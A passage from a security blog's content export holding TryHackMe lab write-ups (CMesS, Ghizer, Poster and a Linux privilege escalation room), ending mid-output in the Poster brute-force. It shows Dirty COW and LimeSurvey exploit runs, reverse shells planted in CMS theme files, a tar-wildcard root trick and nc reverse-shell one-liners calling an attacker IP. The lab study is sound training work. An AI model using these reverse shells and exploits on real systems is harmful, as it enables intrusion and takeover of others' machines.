16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  user@debian:~$ perl /tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl ############################# Linux Exploit Suggester 2 ############################# Local Kernel: 2.6.32 Searching 72 exploits... Possible Exploits [1] american-sign-language CVE-2010-4347 Source: http://www.securityfocus.com/bid/45408 [2] can_bcm CVE-2010-2959 Source: http://www.exploit-db.com/exploits/14814 [3] dirty_cow CVE-2016-5195 Source: http://www.exploit-db.com/exploits/40616 [4] exploit_x CVE-2018-14665 Source: http://www.exploit-db.com/exploits/45697 [5] half_nelson1 Alt: econet CVE-2010-3848 Source: http://www.exploit-db.com/exploits/17787 [6] half_nelson2 Alt: econet CVE-2010-3850 Source: http://www.exploit-db.com/exploits/17787 [7] half_nelson3 Alt: econet CVE-2010-4073 Source: http://www.exploit-db.com/exploits/17787 [8] msr CVE-2013-0268 Source: http://www.exploit-db.com/exploits/27297 [9] pktcdvd CVE-2010-3437 Source: http://www.exploit-db.com/exploits/15150 [10] ptrace_kmod2 Alt: ia32syscall,robert_you_suck CVE-2010-3301 Source: http://www.exploit-db.com/exploits/15023 [11] rawmodePTY CVE-2014-0196 Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c [12] rds CVE-2010-3904 Source: http://www.exploit-db.com/exploits/15285 [13] reiserfs CVE-2010-1146 Source: http://www.exploit-db.com/exploits/12130 [14] video4linux CVE-2010-3081 Source: http://www.exploit-db.com/exploits/15024   From the output above we can see listed Linux kernel exploit called Dirty COW. This exploit replaces the SUID file /usr/bin/passwd with one that spawns a shell.\nWe will compile the exploit code and run it as shown below.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  user@debian:~/tools/kernel-exploits/dirtycow$ ls c0w c0w.c user@debian:~/tools/kernel-exploits/dirtycow$ ./c0w (___) (o o)_____/ @@ ` \\  \\ ____, //usr/bin/passwd // // ^^ ^^ DirtyCow root privilege escalation Backing up /usr/bin/passwd to /tmp/bak mmap 92d01000 madvise 0 ptrace 0   Once the exploit completes, we will run /usr/bin/passwd to gain a root shell:\n1 2 3  user@debian:~/tools/kernel-exploits/dirtycow$ /usr/bin/passwd root@debian:/home/user/tools/kernel-exploits/dirtycow# id uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)   \rThank you for reading this blog post.\n","description":"Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root.","id":4,"section":"posts","tags":["exploitation","privilege escalation"],"title":"Linux Privilege Escalation [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/linux-privilege-escalation/"},{"content":"   Title  CMesS     Info  Can you root this Gila CMS box?   Difficulty  Medium   Date 2021/04/11    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.93.26. Before performing any scanning or enumeration, we will add 10.10.93.26 cmess.thm to our hosts file located in the /etc directory.\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  nmap -v -A -T4 cmess.thm Nmap scan report for cmess.thm (10.10.93.26) Host is up (0.081s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA) | 256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA) |_ 256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: Gila CMS | http-methods: |_ Supported Methods: GET POST OPTIONS | http-robots.txt: 3 disallowed entries |_/src/ /themes/ /lib/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   Since we do not have a SSH username or password, we will continue with port 80.\nPort 80 Here we have a welcome page for Gila CMS which is an open source content management system, and a page builder.\n\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  gobuster dir -e -u http://10.10.93.26/ -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.93.26/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/11 05:19:44 Starting gobuster in directory enumeration mode =============================================================== http://10.10.93.26/.hta (Status: 403) [Size: 276] http://10.10.93.26/.htaccess (Status: 403) [Size: 276] http://10.10.93.26/.htpasswd (Status: 403) [Size: 276] http://10.10.93.26/0 (Status: 200) [Size: 3857] http://10.10.93.26/01 (Status: 200) [Size: 4086] http://10.10.93.26/1 (Status: 200) [Size: 4086] http://10.10.93.26/1x1 (Status: 200) [Size: 4086] http://10.10.93.26/About (Status: 200) [Size: 3343] http://10.10.93.26/about (Status: 200) [Size: 3357] http://10.10.93.26/admin (Status: 200) [Size: 1582] http://10.10.93.26/api (Status: 200) [Size: 0] http://10.10.93.26/assets (Status: 301) [Size: 322] [--\u0026gt; http://10.10.93.26/assets/?url=assets] http://10.10.93.26/author (Status: 200) [Size: 3596] http://10.10.93.26/blog (Status: 200) [Size: 3857] http://10.10.93.26/category (Status: 200) [Size: 3868] http://10.10.93.26/cm (Status: 500) [Size: 0] http://10.10.93.26/feed (Status: 200) [Size: 735] http://10.10.93.26/fm (Status: 200) [Size: 0] http://10.10.93.26/index (Status: 200) [Size: 3857] http://10.10.93.26/Index (Status: 200) [Size: 3857] http://10.10.93.26/lib (Status: 301) [Size: 316] [--\u0026gt; http://10.10.93.26/lib/?url=lib] http://10.10.93.26/log (Status: 301) [Size: 316] [--\u0026gt; http://10.10.93.26/log/?url=log] http://10.10.93.26/login (Status: 200) [Size: 1582] http://10.10.93.26/robots.txt (Status: 200) [Size: 65] http://10.10.93.26/search (Status: 200) [Size: 3857] http://10.10.93.26/Search (Status: 200) [Size: 3857] http://10.10.93.26/server-status (Status: 403) [Size: 276] http://10.10.93.26/sites (Status: 301) [Size: 320] [--\u0026gt; http://10.10.93.26/sites/?url=sites] http://10.10.93.26/src (Status: 301) [Size: 316] [--\u0026gt; http://10.10.93.26/src/?url=src] http://10.10.93.26/tag (Status: 200) [Size: 3880] http://10.10.93.26/tags (Status: 200) [Size: 3143] http://10.10.93.26/themes (Status: 301) [Size: 322] [--\u0026gt; http://10.10.93.26/themes/?url=themes] http://10.10.93.26/tmp (Status: 301) [Size: 316] [--\u0026gt; http://10.10.93.26/tmp/?url=tmp]   Performing directory brute-forcing we will get many valid resources. It would be a good idea to continue with brute-forcing each found directory, but before we will proceed with subdomain fuzzing.\nSubdomain Fuzzing Using wfuzz with specified place to fuzz \u0026quot;Host: FUZZ.cmess.thm\u0026quot; we will find dev subdomain.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u \u0026#34;http://cmess.thm/\u0026#34; -H \u0026#34;Host: FUZZ.cmess.thm\u0026#34; --hl 107 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://cmess.thm/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000019: 200 30 L 104 W 934 Ch \u0026#34;dev\u0026#34; Total time: 0 Processed Requests: 4989 Filtered Requests: 4988 Requests/sec.: 0   Let us add dev subdomain to our hosts file located in /etc directory as shown below.\n1  10.10.93.26 cmess.thm dev.cmess.thm   Visiting this subdomain a development log is revealed with possible user:password combination.\n\nGaining CMS Access Earlier we found /admin resource where we will try to login as a user andre.\n\nGaining System Access Credentials from a development log are valid which means we are successfully logged in.\nIt is possible to gain a reverse shell via RCE thanks to inserting our malicious code inside one of the php files located in Administration -\u0026gt; Themes -\u0026gt;Gila.\nWe will choose footer.php and insert our reverse shell code as shown below on the lines 18 - 22.\n\nSimultaneously, we will start a listener on our local machine. Saving modified php file and visiting the main page we will get a shell as a user www-data.\n1 2 3 4 5 6 7 8  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.93.26] 40606 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;; www-data@cmess:/home$   Horizontal Privilege Escalation User andre Doing a basic manual system enumeration, we will find a backup of user andre password located inside /opt directory. Using these credentials, we can switch user with the command su.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  www-data@cmess:/var/www$ cd /opt cd /opt www-data@cmess:/opt$ ls -la ls -la total 12 drwxr-xr-x 2 root root 4096 Feb 6 2020 . drwxr-xr-x 22 root root 4096 Feb 6 2020 .. -rwxrwxrwx 1 root root 36 Feb 6 2020 .password.bak www-data@cmess:/opt$ cat .password.bak cat .password.bak andres backup password \u0026lt;REDACTED\u0026gt; www-data@cmess:/opt$ su andre su andre Password: \u0026lt;REDACTED\u0026gt; andre@cmess:/opt$ id id uid=1000(andre) gid=1000(andre) groups=1000(andre)   Privilege Escalation Once again performing a basic manual system enumeration, we will find a cron job owned by root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  andre@cmess:/opt$ cat /etc/crontab cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) */2 * * * * root cd /home/andre/backup \u0026amp;\u0026amp; tar -zcf /tmp/andre_backup.tar.gz *   Job on the fifth line on the output above compresses /backup directory into tar archive and saves it to the /tmp directory.\n1 2 3 4 5 6 7 8 9 10 11 12  andre@cmess:/opt$ cd /home/andre/backup cd /home/andre/backup andre@cmess:~/backup$ ls -la ls -la total 12 drwxr-x--- 2 andre andre 4096 Feb 9 2020 . drwxr-x--- 4 andre andre 4096 Feb 9 2020 .. -rwxr-x--- 1 andre andre 51 Feb 9 2020 note andre@cmess:~/backup$ cat note\tcat note Note to self. Anything in here will be backed up!   We can possibly try to exploit tar binary but there is a another way with optional switches.\nThese switches offer the following options :\n–checkpoint[=NUMBER]\n show progress messages every Numbers record (default 10)  –checkpoint-action=ACTION\n execute ACTION on each checkpoint   There is a –checkpoint-action option, that will specify the program which will be executed when the checkpoint is reached. Mainly, this permits us to run an arbitrary command. Hence Options –checkpoint=1 and –checkpoint-action=exec=sh shell.sh are handed to the tar program as command-line options.\nExploiting Wildcard for Privilege Escalation\n Inside /backup directory on the target machine, we will create revshell.sh with bash reverse shell inside. Then we will set up checkpoints which will execute our shell script.\n1 2 3 4  andre@cmess:~/backup$ echo \u0026#39;#!/bin/bash\u0026#39; \u0026gt; revshell.sh andre@cmess:~/backup$ echo \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.9.140.180 8888 \u0026gt;/tmp/f \u0026#39; \u0026gt;\u0026gt; revshell.sh andre@cmess:~/backup$ echo \u0026#34;\u0026#34; \u0026gt; --checkpoint=1 andre@cmess:~/backup$ echo \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=sh revshell.sh\u0026#34;   We will start a listener on our local machine and wait for the execution of revshell.sh on the target machine.\n1 2 3 4 5 6  nc -lnvp 8888 listening on [any] 8888 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.93.26] 34570 /bin/sh: 0: can\u0026#39;t access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root)   Based on the output above, we can see that we have a root shell.\n\rThank you for reading this blog post.\n","description":"Can you root this Gila CMS box?","id":5,"section":"posts","tags":["enumeration","cms","remote code execution","privilege escalation"],"title":"CMesS [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/cmess/"},{"content":"   Title  Ghizer     Info  Lucrecia has installed multiple web applications on the server.   Difficulty  Medium   Date 2021/04/05    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.40.50\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9  nmap -v -sS -sV 10.10.40.50 Nmap scan report for 10.10.40.50 Host is up (0.088s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp? 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu))   Port 21 (ftp) There is not Anonymous authentication for this FTP service.\nPort 80 (http) LimeSurvey is an advanced online survey system to create online surveys.\n\nPort 443 (https) Here we can find a WordPress site with a note that the default /wp-login was hidden.\n\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  gobuster dir -e -u http://10.10.40.50 -w /usr/share/wordlists/dirb/common.txt -x txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.40.50 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/05 07:39:01 Starting gobuster in directory enumeration mode =============================================================== http://10.10.40.50/.hta (Status: 403) [Size: 276] http://10.10.40.50/.hta.txt (Status: 403) [Size: 276] http://10.10.40.50/.htaccess (Status: 403) [Size: 276] http://10.10.40.50/.htpasswd.txt (Status: 403) [Size: 276] http://10.10.40.50/.htaccess.txt (Status: 403) [Size: 276] http://10.10.40.50/.htpasswd (Status: 403) [Size: 276] http://10.10.40.50/admin (Status: 301) [Size: 310] [--\u0026gt; http://10.10.40.50/admin/] http://10.10.40.50/application (Status: 301) [Size: 316] [--\u0026gt; http://10.10.40.50/application/] http://10.10.40.50/assets (Status: 301) [Size: 311] [--\u0026gt; http://10.10.40.50/assets/] http://10.10.40.50/docs (Status: 301) [Size: 309] [--\u0026gt; http://10.10.40.50/docs/] http://10.10.40.50/framework (Status: 301) [Size: 314] [--\u0026gt; http://10.10.40.50/framework/] http://10.10.40.50/index.php (Status: 200) [Size: 40931] http://10.10.40.50/installer (Status: 301) [Size: 314] [--\u0026gt; http://10.10.40.50/installer/] http://10.10.40.50/locale (Status: 301) [Size: 311] [--\u0026gt; http://10.10.40.50/locale/] http://10.10.40.50/plugins (Status: 301) [Size: 312] [--\u0026gt; http://10.10.40.50/plugins/] http://10.10.40.50/server-status (Status: 403) [Size: 276] http://10.10.40.50/tests (Status: 301) [Size: 310] [--\u0026gt; http://10.10.40.50/tests/] http://10.10.40.50/themes (Status: 301) [Size: 311] [--\u0026gt; http://10.10.40.50/themes/] http://10.10.40.50/tmp (Status: 301) [Size: 308] [--\u0026gt; http://10.10.40.50/tmp/] http://10.10.40.50/upload (Status: 301) [Size: 311] [--\u0026gt; http://10.10.40.50/upload/]   Navigating to the found /admin resource we have a login portal.\n\nUsing the default LimeSurvey credentials admin:password, we can successfully log in.\n\nCurrent running LimeSurvey version is 3.15.9.\nLimeSurvey Exploitation Using searchsploit, we will find that there is a RCE for LimeSurvey versions \u0026lt; 3.16.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  searchsploit limesurvey ----------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------- --------------------------------- LimeSurvey (PHPSurveyor 1.91+ stable) - Blind SQL Injection | php/webapps/18508.txt LimeSurvey (phpsurveyor) 1.49rc2 - Remote File Inclusion | php/webapps/4156.txt LimeSurvey 1.52 - \u0026#39;language.php\u0026#39; Remote File Inclusion | php/webapps/4544.txt LimeSurvey 1.85+ - \u0026#39;admin.php\u0026#39; Cross-Site Scripting | php/webapps/35787.txt LimeSurvey 1.92+ build120620 - Multiple Vulnerabilities | php/webapps/19330.txt LimeSurvey 2.00+ (build 131107) - Multiple Vulnerabilities | php/webapps/29789.txt LimeSurvey 3.17.13 - Cross-Site Scripting | php/webapps/47386.txt LimeSurvey 4.1.11 - \u0026#39;File Manager\u0026#39; Path Traversal | php/webapps/48297.txt LimeSurvey 4.1.11 - \u0026#39;Permission Roles\u0026#39; Persistent Cross-Site Scripting | php/webapps/48523.txt LimeSurvey 4.1.11 - \u0026#39;Survey Groups\u0026#39; Persistent Cross-Site Scripting | php/webapps/48289.txt LimeSurvey 4.3.10 - \u0026#39;Survey Menu\u0026#39; Persistent Cross-Site Scripting | php/webapps/48762.txt LimeSurvey \u0026lt; 3.16 - Remote Code Execution | php/webapps/46634.py ----------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   Gaining Access This exploit can be find on the Exploit-DB. The point of this exploitation is that the vulnerable versions are affected to a serialization attack via the “phar://” wrapper.\nProviding found default credentials and running the exploit will give us a shell as a user www-data.\n1 2 3 4 5 6 7 8 9 10 11  python 46634.py http://10.10.40.50 admin password [*] Logging in to LimeSurvey... [*] Creating a new Survey... [+] SurveyID: 231443 [*] Uploading a malicious PHAR... [*] Sending the Payload... [*] TCPDF Response: \u0026lt;strong\u0026gt;TCPDF ERROR: \u0026lt;/strong\u0026gt;[Image] Unable to get the size of the image: phar://./upload/surveys/231443/files/malicious.jpg [+] Pwned! :) [+] Getting the shell... $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)   Performing a basic manual enumeration, we will find a config.php for LimeSurvey.\n1 2 3 4 5 6 7  $ find / -type f -name \u0026#34;config.php\u0026#34; 2\u0026gt;/dev/null /var/www/html/wordpress/wp-content/plugins/akismet/views/config.php /var/www/html/limesurvey/framework/messages/config.php /var/www/html/limesurvey/application/config/config.php /var/www/html/limesurvey/third_party/kcfinder/conf/config.php cat /var/www/html/limesurvey/application/config/config.php   This file includes credentials for a user called Anny.\n1 2 3 4 5 6 7 8 9 10 11 12  . . . return array( \u0026#39;components\u0026#39; =\u0026gt; array( \u0026#39;db\u0026#39; =\u0026gt; array( \u0026#39;connectionString\u0026#39; =\u0026gt; \u0026#39;mysql:host=localhost;port=3306;dbname=limedb;\u0026#39;, \u0026#39;emulatePrepare\u0026#39; =\u0026gt; true, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;Anny\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;\u0026lt;REDACTED\u0026gt;\u0026#39;, \u0026#39;charset\u0026#39; =\u0026gt; \u0026#39;utf8mb4\u0026#39;, \u0026#39;tablePrefix\u0026#39; =\u0026gt; \u0026#39;lime_\u0026#39;, ), . . .   Wordpress Exploitaion \nIn the Meta section, we can see Log In label which will redirects us to the hidden login portal. There we can use found credentials to log in as Anny.\nGaining Access From the previous experiences exploiting Wordpress, we know that we can get a reverse shell through the page editor.\nWe will navigate to Appearance -\u0026gt; Editor. Then we will choose /archive.php and change its content to php reverse shell\nAfter editing IP address and desired port, we will press the Update file button.\nBefore visiting updated php file, don’t forget to start a listener on your local machine.\nThen we will navigate to http://10.10.40.50/wp-content/themes/{themename}/archive.php and successfully gain access as a www-data user.\nLateral Movement Performing a basic manual system enumeration, we will find that beside other services there is one running on port 18001. This is a JDWP debug port used by Ghidra when launching in the debug mode opened to all interfaces.\n Ghidra is a Java-based reverse engineering framework that features a graphical user interface (GUI) and has been designed to run on a variety of platforms including Windows, macOS, and Linux. (more)\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  $ netstat -tulnp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:18001 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp6 0 0 :::34051 :::* LISTEN - tcp6 0 0 :::37805 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::18002 :::* LISTEN - tcp6 0 0 ::1:631 :::* LISTEN - tcp6 0 0 :::443 :::* LISTEN - tcp6 0 0 :::443 :::* LISTEN - tcp6 0 0 :::443 :::* LISTEN - udp 0 0 0.0.0.0:5353 0.0.0.0:* - udp 0 0 0.0.0.0:33149 0.0.0.0:* - udp 0 0 0.0.0.0:631 0.0.0.0:* - udp 0 0 0.0.0.0:68 0.0.0.0:* - udp6 0 0 :::5353 :::* - udp6 0 0 :::58160 :::* -   It is possible to perform RCE Through JDWP Debug Port. We will proceed according to the PoC video. The main point is to set a breakpoint on a class with run() method. Then when the breakpoint is hit, we will execute java reverse shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  www-data@ubuntu:/$ jdb -attach 127.0.0.1:18001 jdb -attach 127.0.0.1:18001 Set uncaught java.lang.Throwable Set deferred uncaught java.lang.Throwable Initializing jdb ... \u0026gt; classpath classpath base directory: /home/veronica classpath: [/home/veronica/ghidra_9.0/support/../Ghidra/Framework/Utility/lib/Utility.jar] \u0026gt; classes . . . \u0026gt; stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() \u0026gt; Breakpoint hit: \u0026#34;thread=Log4j2-TF-4-Scheduled-1\u0026#34;, org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0 Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec(“nc -e 10.9.140.180 8888 /bin/sh”)   On the output below, we can see that we received a shell as a user veronica.\n1 2 3 4 5 6 7 8 9  nc -lnvp 8888 listening on [any] 8888 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.98.112] 55378 id uid=1000(veronica) gid=1000(veronica) groups=1000(veronica),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;; veronica@ubuntu:~$ wc user.txt wc user.txt 1 1 70 user.txt   Privilege Escalation By issuing sudo -l, we can see which commands we can execute as root and some other important information.\n1 2 3 4 5 6 7 8 9  veronica@ubuntu:~$ sudo -l sudo -l Matching Defaults entries for veronica on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User veronica may run the following commands on ubuntu: (ALL : ALL) ALL (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py   Based on the output above, we can ran base.py as a user root.\nWe will delete this file and create a python script with the same name and one liner to spawn a bash shell as a user root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  veronica@ubuntu:~$ ls -la ls -la total 152 drwxr-xr-x 22 veronica veronica 4096 Apr 5 07:05 . drwxr-xr-x 3 root root 4096 Jul 23 2020 .. -rw-r--r-- 1 root root 86 Jul 23 2020 base.py . . . veronica@ubuntu:~$ rm -rf /home/veronica/base.py veronica@ubuntu:~$ echo \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt; base.py veronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py sudo /usr/bin/python3.5 /home/veronica/base.py root@ubuntu:~# id id uid=0(root) gid=0(root) groups=0(root) root@ubuntu:~# wc /root/root.txt wc /root/root.txt 1 1 70 /root/root.txt   Thanks to the fact that NOPASSWD is set for this command, we are able to successfully execute our base.py and get a root shell.\n\rThank you for reading this blog post.\n","description":"Lucrecia has installed multiple web applications on the server.","id":6,"section":"posts","tags":["enumeration","wordpress","exploitation","privilege escalation"],"title":"Ghizer [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/ghizer/"},{"content":"   Title  Poster     Info  The sys admin set up a rdbms in a safe way.   Difficulty  Easy   Date 2021/04/03    Scanning \u0026amp; Enumeration We are given a host with 10.10.211.18 IP address.\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  nmap -v -p- -A -T4 10.10.211.18 Nmap scan report for 10.10.211.18 Host is up (0.071s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA) | 256 eb:3a:a3:4e:6f:10:00🆎ef:fc:c5:2b:0e:db:40:57 (ECDSA) |_ 256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Poster CMS 5432/tcp open postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.21 | ssl-cert: Subject: commonName=ubuntu | Issuer: commonName=ubuntu | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-07-29T00:54:25 | Not valid after: 2030-07-27T00:54:25 | MD5: da57 3213 e9aa 9274 d0be c1b0 bbb2 0b09 |_SHA-1: 4e03 8469 28f7 673b 2bb2 0440 4ba9 e4d2 a0d0 5dd5 |_ssl-date: TLS randomness does not represent time Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   We can see that the PostgreSQL service is open on the target and running version 9.5.8 - 9.5.10 or 9.5.17 - 9.5.21\nUser credentials enumeration Metasploit offers auxiliary module which will attempt to brute-force the login to the PostgreSQL database using a list of default usernames and passwords.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  msf6 \u0026gt; use auxiliary/scanner/postgres/postgres_login msf6 auxiliary(scanner/postgres/postgres_login) \u0026gt; show options Module options (auxiliary/scanner/postgres/postgres_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DATABASE template1 yes The database to authenticate against DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no A specific password to authenticate with PASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt no File containing passwords, one per line Proxies no A proxy chain of format type:host:port[,type:host:port][...] RETURN_ROWSET true no Set to true to see query result sets RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no A specific username to authenticate as USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt no File containing (space-separated) users and passwords, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt no File containing users, one per line VERBOSE true yes Whether to print output for all attempts   Before running this module we need to set remote hosts option (RHOSTS). Then we can launch the module with the following command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  msf6 auxiliary(scanner/postgres/postgres_login) \u0026gt; run [!] No active DB -- Credential data will not be saved! [-] 10.10.211.18:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password) [+] 10.10.211.18:5432 - Login Successful: postgres:password@template1 [-] 10.10.211.18:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: 